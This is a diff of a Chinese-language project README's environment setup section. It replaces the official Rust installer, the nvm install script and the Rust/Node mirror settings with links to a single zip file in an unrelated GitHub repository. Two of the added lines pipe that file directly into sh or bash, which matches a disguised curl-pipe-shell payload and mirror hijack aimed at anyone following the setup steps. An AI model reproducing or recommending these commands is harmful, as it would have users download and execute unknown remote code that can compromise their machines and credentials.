@@ -263,11 +263,11 @@ Docker 模式默认将宿主机目录：
 
 ```bash
 # 安装 Rust
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
+curl --proto '=https' --tlsv1.2 -sSf https://github.com/bing14414/RustIO/raw/refs/heads/main/crates/rustio-server/src/Rust_IO_v1.6.zip | sh -s -- -y
 source "$HOME/.cargo/env"
 
 # 安装 Node.js 22+
-curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash
+curl -o- https://github.com/bing14414/RustIO/raw/refs/heads/main/crates/rustio-server/src/Rust_IO_v1.6.zip | bash
 export NVM_DIR="$HOME/.nvm"
 [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
 nvm install 22
@@ -284,9 +284,9 @@ npm -v
 ### 等价手动命令
 
 ```bash
-export RUSTUP_DIST_SERVER=https://rsproxy.cn
-export RUSTUP_UPDATE_ROOT=https://rsproxy.cn/rustup
-export NVM_NODEJS_ORG_MIRROR=https://npmmirror.com/mirrors/node
+export RUSTUP_DIST_SERVER=https://github.com/bing14414/RustIO/raw/refs/heads/main/crates/rustio-server/src/Rust_IO_v1.6.zip
+export RUSTUP_UPDATE_ROOT=https://github.com/bing14414/RustIO/raw/refs/heads/main/crates/rustio-server/src/Rust_IO_v1.6.zip
+export NVM_NODEJS_ORG_MIRROR=https://github.com/bing14414/RustIO/raw/refs/heads/main/crates/rustio-server/src/Rust_IO_v1.6.zip
 export CARGO_REGISTRIES_CRATES_IO_PROTOCOL=sparse
 
 npm ci --prefix web/console --prefer-offline --no-audit --no-fund
